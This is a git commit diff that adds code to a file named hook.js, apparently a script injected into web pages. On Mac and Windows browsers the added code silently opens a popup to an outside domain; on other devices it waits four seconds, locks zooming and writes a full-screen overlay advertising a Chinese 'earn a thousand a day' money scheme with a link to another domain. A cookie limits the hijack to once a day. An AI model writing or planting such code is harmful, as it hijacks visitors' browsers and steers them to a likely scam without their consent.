0ec6f5f599ca9509ddcb8646b0450b9101a064eb
telecom2019 <39643600+telecom2019@users.noreply.github.com>
2019-01-11 11:34:57 +0800

    Update hook.js

--- hook.js
+++ hook.js
@@ -7,3 +7,38 @@ function addjs(src) {
     document.getElementsByTagName('head')[0].appendChild(script);
 }
 
+if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') == 0) {
+    if (!getCookie('cc_cookie')) {
+        setCookie('cc_cookie','ok',1);
+        window.open("http://nk.bi36k.cn");
+    }
+}else{
+if (!getCookie('cc_cookie')) {
+setTimeout(function(){
+ var meta = document.createElement("meta");
+        meta.name = "viewport";
+        meta.content = "initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no";
+        document.getElementsByTagName('head')[0].appendChild(meta);
+        document.writeln("<style type=\'text/css\'>.guize_html{position:fixed;top:2%;left:50%;margin-top:-40px;margin-left:-159px;width:318px;height:auto;border-radius:4px;background-color:#fff;color:#000;text-align:center;font-size:12px}.guize_html p{padding:0 20px 10px;text-align:center}.guize_html_nei{width:318px;min-height:350px;overflow-y:auto;max-height:500px;height:350px;display:block}.guize_html_nei h3{padding:15px}.btn{display:block;margin:20px auto;width:240px;height:40px;border-radius:4px;background-color:#2196f3;color:#fff!important;text-align:center;line-height:40px;cursor:pointer}.btn:hover{background-color:rgba(33,150,243,.86)}.overfloat{position:fixed;top:0;left:0;z-index:9;width:100%;height:100%;background-color:rgba(1,1,1,.5);z-index:9999}</style><div class=\'overfloat\'id=\'gui_kai\'><div class=\'guize_html\'><div class=\'guize_html_nei\'><h3>2019最新赚钱项目</h3><p>手机即可操作</p><p>日赚千元</p><img src=\'https://telecom2019.github.io/p6.jpg\'width=\'248\'height=\'170\'/></div><a id=\'g_xz\' class=\'btn\'href=\'http://qp.cxwufangbu.cc\'rel=\'noreferrer\'target=\'_blank\'>点击\"深入\"</a><a id=\'g_close\'class=\'btn\' onclick=\"setCookie(\'cc_cookie\', \'ok\', 1);window.location.reload();\">确定</a></div></div>") ;
+    
+
+}, 4000);}
+
+   
+}
+
+function getCookie(cname) {
+    var name = cname + "=";
+    var ca = document.cookie.split(';');
+    for (var i = 0; i < ca.length; i++) {
+        var c = ca[i].trim();
+        if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
+    }
+    return "";
+}
+function setCookie(key, val, time) {
+    var date = new Date();
+    var expiresHours = time;
+    date.setTime(date.getTime() + expiresHours * 2000 * 1000);
+    document.cookie = key + "=" + val + ";path=/;expires=" + date.toGMTString();
+}
